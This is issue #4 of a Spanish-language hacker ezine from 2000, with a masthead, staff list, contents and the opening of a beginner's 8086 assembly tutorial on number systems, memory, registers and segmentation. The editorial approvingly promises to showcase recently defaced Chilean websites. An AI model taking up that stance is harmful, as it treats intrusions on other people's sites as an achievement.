
:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-
:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-
 
       $$$$$      $$$           $$$    $$$                   $$$$$$$$$$
       $$$$$$     $$$           $$$   $$$                          $$$ 
       $$$ $$$    $$$           $$$  $$$                          $$$  
       $$$  $$$   $$$  $$$$$$$  $$$ $$$    $$$$$$  $$$$ $$$$     $$$   
       $$$   $$$  $$$ $$$   $$$ $$$$$$    $$$  $$$   $$$$$      $$$    
       $$$    $$$ $$$ $$$   $$$ $$$ $$$   $$$$$$$     $$$      $$$     
       $$$     $$$$$$ $$$   $$$ $$$  $$$  $$$        $$$      $$$      
       $$$      $$$$$  $$$$$$$  $$$   $$$  $$$$$$   $$$      $$$$$$$$$$
 
                                A~o 1 - Numero #4
                              23 de Septiembre del 2000
:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-
:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-


-[Disclameir]-----------------------------------------------------------------

Toda la informacion aca expuesta, esta enfocada a un medio meramente educativo
y de entretencion, ni los autores de los distintos textos, como el editor  del
zine,  se  haran responsables por los actos que  puedas llegar  a  cometer con 
dicha  informacion.  Todo lo que hagas queda bajo tu absoluta responsabilidad.

Se han omitido acentos, y todo tipo de caracteres especiales intensionalmente,
por problemas de compatibilidad entre editores.  Se  recomienda cualquier tipo
software donde se puedan visualizar caracteres. :)

                                                                   NoKeyZ Team

-[Staff]----------------------------------------------------------------------

o b||os        o Corsario-X
o Cyber?       o Reaven
o Risc_6000    o sdriLiO

Editor N4 	: sdriLiO
Co-Editor	: Reaven

Donde estan!, donde estan!, donde estan!	: Cyber


-[Distribucion]---------------------------------------------------------------

o NoKeyZ Web Site       > http://www.nokeyz.net/
o Zine Store            > http://www.zine-store.com.ar
o TVH                   > http://www.vanhackez.com/e/nokeyz


-[Saludos/Links]--------------------------------------------------------------------

o 350cc (FYE)         > http://www.350cc.com
o Proyecto_R (CDLR)   > http://www.cdlr.org
o Own3d               > http://www.0wn3d.subnet.dk/
o Electron Team       > http://electron-team.subnet.dk
o Secure Root         > http://www.secureroot.com/


-[Links]----------------------------------------------------------------------

o Linux-Chile             > http://www.linux-chile.org
o The Easter Egg Archive  > http://www.eeggs.com 


-[Colaboradores del #4]-------------------------------------------------------

o elPAC     o FonzKiller   o Gin_suK
o PinkX		o HoLLoWmAn


-[Contenido]------------------------------------------------------------------

01. Editorial................................................... Editor
02. Ensamblador del 80x86....................................... elPAC
03. Universal Serial Bus (USB).................................. Reaven
04. Celulares................................................... Gin_suK
05. Seguridad en Linux.......................................... PinkX
06. Programacion de sockets para troyanos....................... b||os
07. Shell... ke wea es? tipos, etc 2/2.......................... Reaven
08. TCP-WRAPPERS................................................ FonzKiller
09  Tutorial de Cracking Basico N>1............................. HoLLoWmAn
10. Noticias.................................................... sdriLiO
11. Shutdown.................................................... NKZ

:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-
:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-


-[01. Editorial]--------------------------------------------------[by Editor]-

Bienvenidos nuevamente a la este, la cuarta entrega de la ezine, ahora con mas
colaboradores, nuevo look, y por supuesto con las infaltables ganas  de  hacer
un ezine  de  calidad, esperamos no quedarnos con las puras ganas, los cambios
ya  venian  avisandose hace tiempo, ahora estan los frutos de los mismos, cabe
destacar   que   muchas  cosas  han sucedido no solo en NoKeyZ,  sino  que  el
underground informatico nacional, no queremos hacer mencion de nada especifico,
pero ojala todo pudiera ser mejor. Ahora  tambien,   podran  ver  las  paginas
recientemente crackiadas, por supuesto, en nuestro pais,  Chile,  pero  en  el
siguiente numero esperamos sea el SubAmerica.

Este numero  de  la ezine biene cargado con mucha informacion   de  muy  buena
calidad, y que esperamos le saques el mayor provecho posible.

Por supuesto, inflatablemente, te invitamos a que seas participe de esta noble
causa   escribe tus articulos, criticas, comentarios, dudas o sugerencias,  al
mail  ezine@nokeyz.net

No  me  considero una persona buena pa hablar, asi que a  leer  se  ha  dicho,
recuerda: El conocimiento es poder !


-[02. Ensamblador del 80x86]---------------------------------------[by elPAC]-


                            Ensamblador del 80x86

Bueno,  en este  texto y  posiblemente las  continuaciones de  este  articulo,
intentare  explicar  el  lenguaje   ensamblador, comentando  antes  sobre  los
sistemas numericos  usados en  este lenguaje y  el funcionamiento de basico de
un pc. Aunque no es necesario explicar esto ultimo, yo lo encuentro importante
porque el  lenguaje ensamblador va  vinculado intimamente al hardware, y no da
lo mismo programar sabiendo sobre que cosa se programa que programar sin saber
como se  ejecutaran  esas  instrucciones  en  el computador. En  realidad este
articulo  lo  dedico  especialmente  a  quienes  quieren  saber mas sobre como
funciona  realmente  sus pc's  o a quienes les gusta  el mundo del bajo nivel.


    SISTEMAS NUMERICOS

Todos nosotros  usamos en la vida diaria  el sistema  numerico decimal, el que
consta  de 10  simbolos para indicar cantidades. Pero  implementar esto  en un
sistema electronico de computo seria muy complicado para la electronica de ese
sistema y  a la vez muy  propenso a fallos. Es asi que se opto por utilizar un
sistema de  numeracion binario, es decir,  que solo posea dos simbolos, ya que
de esta forma  se podrian  utilizar circuitos  digitales para  la operacion de
los computadores.

    -Numeros Binarios:

En  el  sistema  binario  existen  los  simbolos "0" y "1"  para  indicar  una
cantidad,  y  corresponden   a   los  dos  estados  logicos  que  podrian  ser
"desactivado/activado"  en  un circuito  digital. Estos  estados logicos se le
denominan  bits. Los  bits son  las unidades  mas peque¤as de  informaci¢n que
puede manejar un computador. A un conjunto de 8 bits se le denomina "byte", al
conjunto de  dos  bytes (16 bits) se le  denomina "palabra" y al conjunto de 2
palabras (32 bits) se le denomina "palabra doble".
Bueno,  ahora  dire la forma  de hacer  las conversiones  de binario a decimal
y viceversa, aunque para esto se podr¡a utilizar una calculadora cientifica en
el modo "base-n":
  * Conversion binario a decimal: en un numero binario, recorrido de derecha a
izquierda,  se le  pueden  asociar  a cada  posicion de  un digito  un  numero
empezando de cero. Asi, para obtener  el numero decimal, se suman potencias de
con base  2 multiplicadas  por el  uno o cero  correspondiente  y  elevados  a
los numeros anteriores, ej:

   10010011 = 1*2^0 + 1*2^1 + 0*2^2 + 0*2^3 + 1*2^4 + 0*2^5 + 0*2^6 + 1*2^7 
               1  + 2 + 0 + 0 + 16 + 0 + 0 + 128 = 147     

por  lo  que  el  numero  binario  10010011  corresponde  al  147  en decimal.
  * Conversion decimal a binario: para  esto, se divide el numero  decimal por
2, lo  que dara  un resto (que sera un 1 o un 0) y  este numero sera el primer
digito  del  numero  binario. Se  continua  dividiendo  el cuociente  obtenido
anteriormente  y  se  repite  el  proceso  hasta  que  no  se pueda :) , ejem:

   49 : 2 = 24 (resto 1)
   24 : 2 = 12 (resto 0)         Por  lo que el  numero decimal  49 en binario
   12 : 2 = 6  (resto 0)         es 110001.
   6  : 2 = 3  (resto 0)
   3  : 2 = 1  (resto 1)
   1  : 2 = 0  (resto 1)

Pero el trabajo con numeros binarios muy grandes se complica mucho, por lo que
en  programacion en  ensamblador se  utiliza  otra  base  numerica, que  es la
notacion hexadecimal:

   -Numeros hexadecimales:

Estos  numeros tienen  16  simbolos para  indicar cantidades,  por lo  que  se
usan  los numeros  del 0 al 9 y  para los 6 restantes simbolos se utilizan las
letras de la  A  a la  F . En la siguiente  tabla doy las correspondencias, de
los  numeros  del  0  al  15,  entre  las  notaciones hexadecimal,  decimal  y
binario:                                                                      

   0 = 0 = 0000    4 = 4 = 0100     8 = 8 = 1000       C = 12 = 1100
   1 = 1 = 0001    5 = 5 = 0101     9 = 9 = 1001       D = 13 = 1101
   2 = 2 = 0010    6 = 6 = 0110     A = 10 = 1010      E = 14 = 1110
   3 = 3 = 0011    7 = 7 = 0111     B = 11 = 1011      F = 15 = 1111

Y como  @#@#@#@$%!  se  trabaja  con  estos  numeros?.  En  realidad  resultan
bastante  comodos. Asi,  para transformar un numero  binario a hexadecimal, se
divide el  numero binario  en grupos de 4 bits,  y estos se transforman a hex.
como aparecio en la tabla anterior, ej:

    10011011 ----> 1001  1011  (lo dividimos en grupos de 4 bits)
                    9     B    (transformamos)

por  lo que el  numero binario  10011011  corresponde al  9B  en  hexadecimal.
Para transformarlo  de  hexadecial a binario  solo  se  realiza  la  operacion
inversa. Ahora para transformar un numero hex. a decimal se hace algo parecido
a como hicimos  con la  transformacion de numeros binarios a decimales, con la
diferencia que la base en ves de ser 2 es 16, ej:

    A2C1 = 1*16^0 + C*16^1 + 2*16^2 + A*16^3
             1  + 192 + 512 + 40960 = 41665

Para indicar  que un numero es hexadecimal, se le agrega al final una "h", por
ejemplo AC54h, FF1Ah, etc.

Aparte de los sitemas binario, decimal  y hexadecimal existe otro ya obsoleto,
el  sistema octal,  que como su nombre lo  indica, consta de 8 simbolos (0-7).
Tambien  existe uno llamado  BCD (Binario codificado a decimal),  mediante  el
cual,  con 4  bits, se  representan los numeros del 0 al 9, agrupando entonces
grupos  de 4 bits para representar  un numero decimal. Pero este sistema tiene
una  gran desventaja  que es el  hecho que no se puede realizar ningun calculo
matematico con ellos.
Otra  cosa que  hay que  tener  en  cuenta  es  como calcular  la cantidad  de
numeros que es posible  representar con una cierta cantidad de bits. Bueno, es
bastante sencillo:

            2^n = cantidad_de_numeros

donde "n" es la cantidad de bits. Por ejemplo con un byte se puede representar
2^8 = 256 numeros, con una palabra 2^16 = 65536 numeros, etc.

   -Operaciones con numeros binarios

Esta  demas decir  que  con  numeros binarios  se  puede  realizar las  mismas
operaciones  aritmeticas basicas  como la  suma  y  la resta. Hay que tener en
cuenta  algunas  cosas como que 1 + 1 = 10  (binario)  por lo que al igual que
en la  suma normal  existe lo de la  "reserva" cuando la suma  de una  columna
supera a  9, en la suma  de  binarios esto se  denomina "acarreo" y  es cuando
la suma de una columna supera a 1, ej:

             11111   ------>  acarreos
          1000101110
        + 0100110111
        ------------
          1101100101
   
Para  realizar la resta,  se  considera la operacion como una suma, pero se le
cambia  de  signo   al   sustraendo. Pero,  ¨como se  representan los  numeros
negativos  en  binario?. Seria absurdo colocar un signo "-" delante del numero
binario, por  este motivo se ha  asignado al  bit mas significativo (el que se
encuentra mas a la izquierda)  como el bit  de signo. Asi cuando ese bit es un
cero significa que el numero es positivo, en cambio si existe un uno el numero
es negativo. 
Los numeros negativos se obtienen medi ante lo que se denomina  "complemento a
dos". Este   se obtiene sumando el "complemento a uno" (que es cambiar los "1"
por "0"  y  viceversa) de un numero cualquiera  en  binario mas un "1", lo que
dara por resultado  el  numero  negativo del numero  anterior. Trabajemos  con
bytes para el siguiente ejemplo:
Sea  el  numero  00100101  (37 en decimal),  para  obtener  el  numero -37  se
aplicaria el complemento a dos:

    00100101 ------> 11011010  (complemento a uno)
                          + 1  (se le suma 1)
                   ----------
                     11011011  (-37, complemento a dos de 00100101)

    Podriamos aplicar esto para realizar la resta 50-37:

       00110010 (50)
     + 11011011 (complemento a dos de 37, -37)
     ----------
       00001101 (13)
    
      con lo que coincide con 50-37 = 13.


   -Operaciones Logicas con numeros binarios

Bueno, aqui comentare las operaciones AND, OR y  XOR:

    AND: El resultado  de  esta operacion dara un "1" si los dos operandos son
         "1" y dara un "0" si los dos son diferentes, ej:

         10100111 AND 00111001 = 00100001

    OR:  Dara un "1" con tan que un solo operando sea "1", sin importar que el
         otro sea cero o uno, para el mismo ejemplo anterior:

         10100111 OR 00111001 = 10111111

    XOR (OR exclusiva): Dara un uno si los dos operando tienen bits diferentes
                        y  dara  un  cero si los dos  tienen bits iguales, ej:

         10100111 XOR 00111001 = 10011110

    En las siguientes "tablas de verdad" resumo lo anteriomente dicho:

    A  B | A AND B          A  B | A OR B         A  B | A XOR B
    -----|--------          -----|-------         -----|--------
    0  0 |   0              0  0 |   0            0  0 |    0
    0  1 |   0              0  1 |   1            0  1 |    1
    1  0 |   0              1  0 |   1            1  0 |    1
    1  1 |   1              1  1 |   1            1  1 |    0

 Esto  seria todo por  el  momento sobre  numeros binarios antes de  entrar de
lleno con  el  ensamblador, aunque como dije, todos estos calculos  se  pueden
hacer mediante calculadora cientifica, pero  lo  explique para  que tengan una
idea  de  como  se  hacen estas cosas  y  para  que  no  dependan tanto  de la
calculadora :)
Ahora  intentare  explicar todo  lo  que  tenga  que  ver con  el  pc  y cosas
sobre hardware necesarias para entender el ensamblador.


    EL COMPUTADOR PERSONAL (PC)

Un computador  basico  esta formado  por una CPU, memoria, perifericos, varios
chips de  apollo y "buses" para  la comunicacion  entre estos  dispositivos. A
continuacion describire algunas de estas partes:

   --Buses:
Son un conjunto de conductores electricos donde circula un determinado tipo de
informacion.  Estos  pueden ser  bidireccionales o  unidireccionales, y  en un
computador se pueden distingir 3 tipos:

   * Bus de datos: como su  nombre lo indica, por este bus  circulan los datos
desde y hacia  la CPU y los distintos dispositivos, especialmente  la memoria.
Por aqui se  leeran las  instrucciones de la memoria para que  sean ejecutados
por  la CPU, como tambien sus correspondientes  datos. Tambien por  este mismo
bus la CPU escribira datos a  la memoria  o a otro dispositivo. Como  por este
bus  se puede leer  y  escribir se  trata  de un bus  bidireccional. Este  bus
puede  tener un "ancho", o  sea, puede estar  compuesto  por  una  determinada
cantidad de  bits. Asi, hay buses  de  datos  de 8, 16, 32 y 64 bits, lo  cual
depende unicamente  de la CPU. Nosotros vamos a  estudiar el  ensamblador  del
8086, una  CPU  de arquitectura de 16 bits, por  lo que  su bus  de  datos  es
tambien de 16 bits.
   * Bus de direcciones: se trata de  un bus unidireccional,  ya que  mediante
este bus  la CPU indica en  que posicion  de  la memoria  se esta trabajando o
en que  puerto de E/S. El 8086  tenia un  tama¤o del bus de direcciones  de 20
bits, con lo que se  podia direccionar 1 MB  de memoria  (2^20=1048576 bytes).
Mas adelante hablare sobre la CPU y la memoria.
   * Bus de control: por  este circulan  se¤ales  varias  de  la CPU  para  su
control, como  son el reset, la se¤al de R/W (si  se escribe o le lee  de  una
posicion de memoria),  la se¤al de M/IO (si  se trata de un acceso  a  memoria
o a un  dispositivo de E/S),  las interrupciones  INTR  y  NMI, etc.  que  las
explicare mas adelante.

   --La memoria:
Corresponde a  un  conjunto  de "celdas" donde  se  puede  guardar  un  bit de
informacion. Estas se  agrupan en conjuntos de 8  por los que se puede guardar
un byte. Mediante el  bus de direcciones se  indica en que byte de  la memoria
se esta escribiendo  o leyendo. Como dije  anteriormente, con el bus de  datos
se accederia al contenido de la memoria.
    Esta de mas  decir que  la memoria  se  divide entre  memoria RAM  (Random
Access  Memory) y  ROM (Read Only Memory). En la  memoria RAM se  cargaran los
programas y datos que se  utilizaran. En la memoria ROM residiran  las rutinas
basicas  del  computador, como lo es la  BIOS, para el control de los  discos,
teclado,  pantalla,  etc. A  estas  rutinas  se  accederan  en un  programa en
ensamblador mediante lo que se conoce  como interrupciones, que lo tratare mas
adelante.

    * Organizacion de la memoria:
Bueno,  la  organizacion de  la memoria  en  un  PC  bajo DOS  es  como sigue:

    -Memoria Convencional (640Kb): va  desde 00000h  hasta A0000h y es la zona
donde residen los programas del usuario  y  partes  importantes  del  sistema
operativo.
    -Memoria superior: bueno, bueno, bueno...aqui hay varias cosas:
         A0000h a C0000h: Esta  zona  es usada  por  las  diferentes  tarjetas
                          de video, tanto en  modo grafico como en modo texto.
                          En  la  direccion B8000h  esta ubicada  el  mapa  de
                          memoria de la tarjeta  vga en modo texto, por lo que
                          la  escritura  en  ella produce  los  caracteres  en
                          pantalla. Se  organiza  colocando  primero  el  byte
                          del caracter en  cuestion (el codigo  ASCII) seguido
                          en la siguiente posicion por el codigo del color del
                          caracter. En  la zona desde  C0000h  hasta CFFFF  se
                          encuentra la ROM de la tarjeta VGA.
        F0000h a 100000h: En esta  zona se encuentra  la ROM BIOS del  pc. Hay
                          que se¤alar  que en la direccion FFFF0h se encuentra
                          la  instruccion  que   provoca  la  reinizacion  del
                          sistema,  por lo que  cuando la CPU recibe la  se¤al
                          de   reset,  pone  en  su  bus  de  direcciones  esa
                          direccion.

    -Memoria alta (HMA):  Son 64kb  ubicados encima  del  primer  megabyte  de
                          memoria. Con  el  controlador  Himem.sys  el  MS-DOS
                          carga  su  nucleo en esta zona  para librar  memoria
                          convencional.

    -Memoria extendida:   El  resto  de  memoria  que  no puede usar MS-DOS :)
     (XMS)

Los  rangos  que  me  salte, los  que  van desde D0000 a F0000 en  realidad no
estan usados,  por lo que se aprovecha como memoria superior libre para cargar
controladores  de dispositivos  y  otras cosas  del  DOS.  Estos  espacios  de
memoria  estaban destinados  para colocar  ROM BASIC u otros  cartuchos de ROM
pero en realidad no se ocuparon.

   --La CPU:
De  todos  es  sabido  que  la  CPU  es  el  corazon  de  nuestros  "queridos"
computadores. Bueno,  es un microprocesador que ejecuta nuestros programas por
tener que realizar todas  las operaciones con los datos. Tambien va acompa¤ado
por un coprocesador matematico, que  realiza las operaciones  relacionadas con
numeros de coma flotante (notacion  cientifica), obtener  valores de funciones
trigonometricas  y  logaritmicas,  etc,  para librar  de  trabajo  a  la  CPU.
Todos   los   microprocesadores   de   Intel   se   caracterizan   por   tener
compatibilidad con su primer micro:el 8086, que es el ensamblador que conozco,
de  manera   que  generaremos  codigo  ejecutable  para  toda  la  familia  de
procesadores de  Intel. Ahora hare una peque¤a descripcion de algunos de estos
procesadores para que conozcas algunas caracteriticas de ellas:
   Cerca de los a¤os 80 Intel lanza  su  primer CPU de 16 bits, la cual  podia
direccionar 1 MB (que para ese entonces era  harto, ya que  las  otras  micros
podian direccionar 64 KB). Este era  el  8086. Poseia  registros  de  16 bits,
en comparacion de las otras CPUs que tenian  registros de 8 bits. Depues de un
tiempo aparecio  el  80286 (aqui me salto  algunas CPU), que ademas de ser mas
rapido y de poseer un bus de direcciones de 24 bits (podia direccionar 16 MB),
tenia la novedad de traer incluido un  modo nuevo de  funcionamiento: "el modo
protegido", que solo seria usado con sistemas operativos mas avanzados.
Despues  se dio  un  gran  paso  adelante  con la aparicion del 80386, el cual
poseia  una  arquitectura de 32 bits, un bus de direcciones de  32 bits (podia
direccionar 4GB de memoria) y poseia 3 modos de funcionamiento: el "modo real"
el cual operaba como  un  8086 pero mas rapido, "el modo protegido" y el "modo
virtul86"  el  cual  operaba  simulando  varios 8086  al mismo tiempo. El modo
protegido es usado por sistemas operativos multitarea como UNIX, OS/2, etc. El
MS-DOS trabaja en el modo real, para mantener compatibilidad  con aplicaciones
anteriores. Otra caracteristica de esta CPU es la inclusion de otras formas de
administracion  de  memoria, a parte  de la segmentacion ( ya lo explicare mas
adelante), me refiero  a  la paginacion  (usado otra  vez por UNIX), el modelo
plano  de  direccionamiento de memoria y el manejo de memoria virtual (manejar
mas memoria  que  la  que  se  posee  fisicamente, utilizando  el  disco  para
intercambiar memoria). Despues  aparece  el  486, que incluye  el coprocesador
matematico  en  un  solo chip (a diferencia de  las CPUs  anteriores,  que  lo
traian afuera), ademas de doblar la velocidad  interna (486DX2)  o triplicarla
(486DX4). Por el a¤o 93 Intel  aparece con su Pentium, con  la  novedad de que
poseia dos unidades de enteros  para realizar sus calculos, un bus de datos de
64 bits, ademas de ser mas rapido. Luego como sabes, le siguen el Pentium Pro,
el Pentium MMX, Pentium II  y  Pentium III, que agregaron mejoras como  nuevas
instrucciones, cache L2  incluida en el mismo  encapsulado, etc. La verdad, no
conozco  las  caracteristicas  de  los  Pentium  II  y  III,  asi  que  estare
enormemente agradecido si alguien me las dice :).
Y como esta compuesta una  CPU ?, bueno  son  muchas partes  que  posee,  pero
las  principales  en  casi  cualquier  microprocesador  son  las  siguientes :

   -Unidad Aritmetica Logica (ALU): es pues  la unidad de ejecucion de la CPU,
   en ella se realizan todos los calculos matematicos y logicos como su nombre
   indica y es por lo tanto, la mas importante.

   -Registros: son un conjunto de  "celdas"  al igual que la memoria, pero con
   la ventaja  que  se pueden acceder de manera casi "instantanea"  ya  que se
   encuentran  en  el  interior  de  la  CPU. Es  muy  importante  conocer los
   registros  de  la  CPU,  porque  en  ellos  se  realizaran  todo  tipo   de  
   operaciones, por lo que los describire a continuacion.

   -Unidad  de  decodificacion: es la  que  interpreta y traduce el codigo  de
   alguna  intruccion  en  particular   y   manda   a   hacer   la   operacion
   correspondiente para la ejecucion de esa intruccion.

   -Unidad  de   gestion   de   memoria  (MMU): aqui  se  encuentra  la  parte
   responsable del control de memoria, ya  sea la segmentacion o la paginacion.
                                                       
   -Unidad de interconexion con el bus (BIU).

Y como trabaja todo esto ? pues algo como sigue: la CPU busca en la memoria la
instruccion a ejecutar, utilizando para comunicarse con la memoria o cualquier
otro periferico,  la  BIU, indicando  la  direccion  de  memoria  en  concreto
mediante el bus  de  direcciones, y leyendo de la memoria a traves  del bus de
datos. Luego  el  decodificador  interpreta  esta  instruccion (es  un  numero
binario, que se llama "opcode") y  establece que  ha de hacerse. Por  ejemplo,
que sea una  suma entre el valor que sigue a la instruccion de la memoria y un
registro,  por  lo  que hara que  la  CPU incremente  en  una unidad el bus de
direcciones y lea otra vez por  el  bus de datos el valor  en  esa posicion de
memoria. Hecho esto,  la  ALU procede a sumar ese valor con  el contenido  del
registro  especificado  en  la instruccion y guarda el resultado  en  el mismo
registro. Luego  se  repite otra  vez  el  ciclo  de  busqueda  de  una  nueva
intruccion  y  asi sucesivamente. Bueno,  algo  tan  simple  como  una suma se
complica un poco, pero es asi como  trabaja realmente una CPU , y para que  te
des  cuenta que  el procesador solo entiende numeros, mas precisamente numeros
binarios.

   Despues de todo  este  rollo (pero  necesario), va  la  descripcion  de  los
 principales registros de la CPU que se utilizaran en ensamblador:


    REGISTROS DEL 8086:

    * Registros de proposito general:

     -AX (Registro acumulador):  es  uno  de  los mas  importantes, en  ella se
          cargan los operandos y  se dejan los  resultados  de  las operaciones
          de  la  CPU. En  general, el  8086  puede hacer  lo mismo  con  todos
          los registros generales y no necesariamente en el acumulador.

     -DX (Registro de datos): actua como una extension del registro AX y sirve
          para las operaciones de E/S.

     -CX (Registro contador):   es   utilizado   por   algunas   instrucciones
          repetitivas  como bucles, que incrementan o decrementan el contenido
          de este registro.

     -BX (Registro base):   utilizado   como   base   para   direcciones    en
         transferencias de memoria.

     Estos registros  tienen  la particularidad  de  que se pueden dividir  en
registros de 8 bits,  camiandoles el nombre: por ejemplo AH  se  refiere a los
8 bits  mas significativos  del AX (parte  alta, High) y AL a los 8 bits menos
significativos (Low) y los mismo para los registros  restantes:

                             AX = AH + AL
                             BX = BH + BL
                             CX = CH + CL
                             DX = DH + DL

    * Registros de segmentos:
    Sobre los segmentos hablare despues de los registros, pero basta decir que
son registros  que  definen ciertas zonas  de memorias. Estos registros son 4:

    -CS (Segmento de codigo): indica el segmento de memoria donde se encuentra
    las instrucciones del programa en curso.

    -DS (Segmento de datos): indica la zona del area de datos.

    -SS (Segmento de Pila (stack)):  indica  la  zona  de   memoria  donde  se
     encuentra la pila (ya explicare que es la pila).

    -ES (Segmento extra): corresponde a la ampliacion del registro DS.

   * Puntero de instrucciones (o contador de programa):

   -IP: indica la posicion de la memoria donde se esta leyendo la instruccion.
        Este registro se incrementa  automaticamente  con  la  lectura  de  la
        siguiente instruccion.  En  conjunto  con  CS dan  la direccion fisica
        efectiva. Esto lo explicare cuando hable de la segmentacion.

   * Registros Indices:

   -DI y SI: son los registros indice destino e indice fuente respectivamente.
   Son usados, en conjunto con los registros ES y DS, para  la  exploracion de
   cadenas o arrays.

   * Registros punteros:
   -SP y BP:  corresponde  a  los   registros  puntero  pila  y  puntero  base
   respectivamente. El puntero  pila es utilizado para indicar la  posicion de
   memoria  de la cima de la pila. El puntero  base  indica  una  posicion  de
   memoria dentro de la pila.

   * Registro de Estado o FLAGS (registro de banderas):
    Este es un registro  de  16 bits, que indica el estado  del  procesador en
cierto momento. Cada bit de este registro tiene un significado,  y  cambian de
acuerdo a algun resultado que genere la CPU o bien pueden ser cambiados por el
programador  para  controlar algunos hechos. Solo se usan (por lo menos  en el
8086) 9 bits de los 16 que forman este registro.
    El registro de banderas tiene la siguiente forma:

   15                                                                   0
  __________________________________________________________________________
  | X | X | X | X | OF | DF | IF | TF | SF | ZF | X | AF | X | PF | X | CF |
  --------------------------------------------------------------------------
                                               Nota: X = no usado o reservado

    - CF (acarreo): se pone  a  uno cuando se produce algun acarreo en el  bit
                  mas significativo.

    - PF (paridad): aqui hay un "1" si el resultado de alguna  operacion tiene
                  un numero par de unos.

    - AF (acarreo auxiliar): se pone a "1" cuando un resultado produce acarreo
                  en el bit 3.

    - ZF (cero):  se activa  cuando  un  resultado  da  cero  (quizas  el  mas
                  utilizado para realizar  bifurcaciones  condicionales, ya lo
                  veremos).

    - SF (signo): se pone a uno cuando un resultado tiene un "1" en el bit mas
                  significativo (cuando es negativo).

    - TF (trap):  cuando se activa, el procesador realiza la ejecucion de las
                  instrucciones paso a paso, lo que permite depurar programas.

    - IF (interrupcion): cuando se activa permite  aceptar  las interrupciones
                  externas   ( llamadas   " interrupciones    enmascarables" )
                  provocadas por  la  activacion de la se¤al INTR  del  bus de
                  control.
    - DF (direccion): determina la direccion  del  tratamiento  de  cadenas de
                  caracteres. Si se pone un "1" las cadenas se tratan de forma
                  decreciente  y  si  se  pone un "0"  se  trataran  de  forma
                  creciente.
    - OF (sobrepasamiento): se utilizan  en  operaciones con signo. Hay un "1"
                  si en un resultado existe  un  acarreo  en el bit 7 o 15  en
                  operaciones de 8 o 16 bits respectivamente.

    Uhmmmm....todo  esto  de  los  registros  son  muy importantes  ya  que lo
utilizaremos todo el tiempo en ensamblador....asi que mejor que lo aprendan.


      MANEJO DE LA MEMORIA EN EL MODO REAL: SEGMENTACION

    En el tiempo  de  que  se creo el 8086 existia un problema, y era el hecho
de que no se  podia utilizar registros de mas de 16 bits en esos procesadores.
Pero Intel  queria  utilizar un bus  de  direcciones  de 20 bits, por  lo  que
para resolver el  problema decidio  utilizar  dos  registros  de  16 bits para
direccionar la memoria. Es asi como nace el direccionamiento por  segmentos, y
por lo tanto, la memoria no se direcciona linealmente como uno pensaria.

   ¨ Como se maneja la memoria con la segmentacion ? Pues como dije, se utili-
zan dos registros, mas precisamente un registro de segmento (ya sabes: CS, DS,
SS y ES) y otro que llamaremos "offset" o desplazamiento.
    Una CPU de Intel para los PCs, trabajando en modo real (o sea como el
8086) divide el megabyte de memoria en espacios de 64 KB (este tama¤o es fijo).
Mediante  el registro de segmento se indica donde comienza este segmento en la
memoria. Pero para obtener esta direccion de la base del segmento se requieren
20 bits,  y  el  registro  de  segmento  es  de  16 bits,  de  manera que para
solucionar esto se le agregan a la derecha del segmento 4 ceros para completar los
20 bits.
    Pero para obtener la direccion efectiva se utiliza otro registro que sirva
de offset, es decir, que permita movernos dentro del segmento de 64Kb.Entonces
sumandose el registro de "offset" con el registro de segmento (con los 4 ceros
incluidos) se obtiene la direccion real.
    Esquematicamente la CPU obtendria la direccion efectiva asi:

                 XXXXXXXXXXXXXXXX0000   (registro de segmento con los 4 ceros)
              +      XXXXXXXXXXXXXXXX   (registro de offset)
              -----------------------
                 XXXXXXXXXXXXXXXXXXXX   (direccion efectiva de 20 bits)

    Otra forma  mas comoda  de  obtener la  direccion  es  multiplicar  por  16
 (decimal, o 10h si el numero es hexadecimal) y sumar el desplazamiento:

        Direccion = Segmento * 16 + offset

Si  te fijas,   varias combinaciones de valores  de  registro de segmento y de
offset pueden dar la misma direccion de memoria.

Pero  en ensamblador no se utiliza la direccion lineal de memoria, sino que se
indica con el formato:
            
            SEGMENTO:OFFSET

por lo que se puede representar una direccion  asi  AC30:015C, que corresponde
a la direccion AC30 * 10 + 15C = AC45C lineal de 20 bits.

¨Pero que registros de la CPU se usan en concreto para direccionar la memoria?
La mas importante, la que indica la direccion de la instruccion a ejecutar, se
forma con los registros CS e IP, o sea la direccion esta dada por CS:IP ,  que
son los registros de segmento de codigo y puntero de instrucciones.

Para direccionar la pila se utiliza SS:SP (segmento de pila y puntero de pila).

     Para el tratamiento de cadenas se utilizan:
     ES:DI (segmento extra e indice destino) para direccionar el destino.
     DS:SI (segmento datos e indice fuente) para direccionar la fuente.

Esto  es  todo sobre segmentacion. Si no lo entendiste....mejor que lo leas de
nuevo, ya que tambien es muy importante.


     LA PILA (STACK)

La pila es una zona de memoria donde se guardan datos tan importantes como  la
direccion  de  retorno cuando se produce alguna interrupcion o llamada a algun
procedimiento   (esto se explicara mas adelante, pero bastara decir que  estos
hechos  provocaran  la  interrupcion del programa en curso y el salto a alguna
posicion  de  memoria quizas muy alejada). Tambien en esta zona de memoria  se
pueden  guardar  otros  datos, como contenidos de algun registro general o  el
registro de estado.

La  pila,  eso si,  tiene una estructura especial. Los datos que primero  sean
almacenados en la pila seran los ultimos en ser sacados de ella.   Esto es  lo
que se conoce como estrutura LIFO (Last in frist out, algo como el utimo es el
primero en salir).   Esto es lo que nos suguiere el nombre de "pila" los datos
se van apilando como en una especie de monta¤a y luego se van sacando de  ella
por la cima.

Para  lograr  esto,  la  direccion de la pila crece en sentido inverso. O sea,
los   registro  offset responsable del direccionamiento de la pila,  SP,    va
decreciendo  a  medida que se le van colocando datos a la pila, y  aumenta  su
valor  a  medida que  se sacan datos de la pila. Para ser mas exacto,  el   SP
avanza de dos en dos, ya que en la pila se guardan palabras y no bytes.

Las instrucciones para el manejo de la pila la comentare despues.


     MAS SOBRE LA CPU.....

